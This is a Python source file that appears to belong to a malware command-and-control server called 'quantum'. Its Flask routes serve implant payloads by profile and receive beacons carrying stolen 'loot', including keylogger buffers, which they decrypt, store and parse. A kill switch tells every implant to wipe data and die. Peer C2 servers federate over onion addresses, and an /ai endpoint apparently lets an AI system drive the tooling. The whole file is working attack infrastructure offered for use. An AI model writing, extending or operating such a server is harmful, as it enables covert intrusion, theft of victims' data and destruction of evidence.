"""quantum.c2.routes — every C2 route (/s /r /ai /kill /federation /dash)."""
from __future__ import annotations

import base64
import json
import os
import threading
import time

from quantum.c2.app import FEDERATION, decrypt_beacon
from quantum.core.deps import Response, jsonify, request
from quantum.core.env import LOG_DIR, LOOT_DIR
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import MitreMapper, _tail_jsonl, log
from quantum.dash import DASH_HTML
from quantum.postexploit.harvest import auto_parse_loot
from quantum.postexploit.killswitch import KILLSWITCH, TASKQ, kill_all_implants


def register_routes(app, agents, API):

    @app.route("/s", defaults={"profile": "default"})
    @app.route("/s/<profile>")
    def s(profile):
        agent_text = agents.get(profile)
        if not agent_text: return "unknown profile", 404
        return agent_text, 200, {"Content-Type": "text/plain"}

    @app.route("/r", methods=["POST"])
    def r():
        d = request.json or {}
        host = d.get("host", "?")
        task, TASKQ[host] = TASKQ.get(host, {}), {}
        if d.get("data") and not d.get("k"):
            os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
            fn = os.path.join(LOOT_DIR, host, f"posix_drop_{int(time.time())}.txt")
            try: open(fn, "wb").write(base64.b64decode(d["data"]))
            except Exception: open(fn, "w").write(str(d["data"]))
            GRAYFISH.seal(fn)
            log(f"C2 posix loot {host} -> {fn}.gfy", "C2")
            return jsonify(task or {"act": "none"})
        if d.get("act") == "hb":
            # V3.1: keylogger buffer pull is automatic — if a kl.klq arrives, seal it
            log(f"C2 hb {host}; reply {task or 'none'}", "C2")
            threading.Thread(target=API.turbine.enroll,
                             args=(host, {"heartbeat": True}), daemon=True).start()
            return jsonify(task or {"act": "none"})
        try: blob = decrypt_beacon(d)
        except Exception as e:
            log(f"decrypt fail {host}: {e}", "ERR"); return jsonify({"act": "none"})
        os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
        fn = os.path.join(LOOT_DIR, host, f"drop_{int(time.time())}.zip")
        open(fn, "wb").write(blob)
        log(f"C2 loot {host}: {len(blob)} bytes", "C2")
        auto_parse_loot(host, fn)
        GRAYFISH.seal(fn)
        return jsonify(task or {"act": "none"})

    @app.route("/ai", methods=["POST"])
    def ai_api():
        d = request.json or {}
        return jsonify(API.handle(d.get("cmd", ""), d.get("params", {})))

    @app.route("/kill", methods=["POST"])
    def kill_switch():
        """V3.1: covert kill-switch — sets wipe/die tasks on every implant queue
        (delivery rides each implant's own encrypted beacon pull)."""
        arm = (request.json or {}).get("arm", True)
        if arm:
            return jsonify(kill_all_implants(wipe_first=(request.json or {}).get("wipe", True)))
        KILLSWITCH["on"] = False
        return jsonify({"killed": [], "note": "kill-switch disarmed"})

    @app.route("/federation/reg", methods=["GET", "POST"])
    def fed_reg():
        if request.method == "POST":
            remote = (request.json or {}).get("implants", {})
            with API.turbine.lock:
                for h, rec in remote.items():
                    if h not in API.turbine.implants: API.turbine.implants[h] = rec
        return jsonify({"implants": API.turbine.implants, "onion": FEDERATION.onion})

    @app.route("/federation/peer", methods=["POST"])
    def fed_peer():
        onion = (request.json or {}).get("onion")
        if onion and onion not in FEDERATION.peers:
            FEDERATION.peers.append(onion)
            open(os.path.join(LOG_DIR, "federation", "peers.json"), "w").write(json.dumps(FEDERATION.peers))
            log(f"FEDERATION: new peer {onion}", "FED")
        return jsonify({"peers": FEDERATION.peers})

    @app.route("/dash")
    def dash():
        return Response(DASH_HTML, mimetype="text/html")

    @app.route("/dash/api/state")
    def dash_state():
        return jsonify({
            "decisions": _tail_jsonl(os.path.join(LOG_DIR, "decisions.jsonl"), 100),
            "audit":     _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 200),
            "mitre":     MitreMapper().map_audit().get("coverage", []),
            "killswitch": KILLSWITCH["on"],
        })

    return app
